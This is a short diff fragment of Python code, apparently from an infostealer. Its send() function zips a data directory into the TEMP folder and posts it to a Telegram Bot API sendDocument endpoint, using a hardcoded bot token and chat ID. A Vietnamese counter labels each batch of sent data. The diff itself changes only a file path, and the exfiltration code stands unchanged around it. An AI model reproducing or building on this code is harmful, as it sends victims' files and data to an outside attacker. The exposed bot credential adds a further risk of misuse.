@@ -446,7 +446,7 @@ def id() :
     return id
 def send():
     number = "Data lần thứ " + str(demso())
-    python310_path = r'C:\Users\Public\Document.zip'
+    python310_path = r'C:Document'
     file_path = r'C:\Users\Public\Document\run.py'
     z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', data_path)
     token = 'https://api.telegram.org/bot6881207827:AAHqzC29EgkakeDLb4xKld-95tyLRaDzFNU/sendDocument';IDchat = '2023824752'
